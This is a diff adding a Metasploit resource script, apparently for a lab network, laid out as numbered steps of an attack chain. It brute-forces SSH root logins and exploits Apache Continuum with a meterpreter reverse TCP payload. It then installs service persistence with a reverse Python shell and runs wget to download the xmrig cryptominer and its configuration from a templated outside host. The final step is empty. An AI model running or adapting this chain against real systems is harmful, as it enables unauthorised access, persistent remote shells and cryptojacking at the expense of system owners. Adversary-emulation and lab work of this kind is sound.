@@ -1,0 +1,55 @@
+# ============================================================
+# STEP 1 - SSH Brute Force
+# ============================================================
+
+use auxiliary/scanner/ssh/ssh_login
+set RHOSTS 192.168.56.181
+set RPORT 22
+set USERNAME root
+set PASS_FILE /home/ahnafrr/Desktop/msf/unix_passwords_modified.txt
+run
+
+# ============================================================
+# STEP 2 - 
+# ============================================================
+
+use exploit/linux/http/apache_continuum_cmd_exec
+set PAYLOAD linux/x86/meterpreter_reverse_tcp
+set LHOST 192.168.56.191
+set RHOSTS 192.168.56.181
+exploit -j -z
+
+# ============================================================
+# STEP 3 - 
+# ============================================================
+
+use exploit/linux/local/service_persistence
+set PAYLOAD cmd/unix/reverse_python
+set SESSION 1
+set VERBOSE true
+set LHOST 192.168.56.191
+exploit -j -z
+
+sessions -k 1,2
+
+# ============================================================
+# STEP 4 - 
+# ============================================================
+
+use exploit/multi/handler
+set PAYLOAD cmd/unix/reverse_python
+set LHOST 192.168.56.191
+exploit -j -z
+
+# ============================================================
+# STEP 5 - 
+# ============================================================
+
+sessions -i 3
+wget --no-check-certificate http://{0}/downloads/xmrig
+wget --no-check-certificate http://{0}/downloads/config.json
+wget --no-check-certificate http://{0}/downloads/SHA256SUMS
+
+# ============================================================
+# STEP 6 - 
+# ============================================================
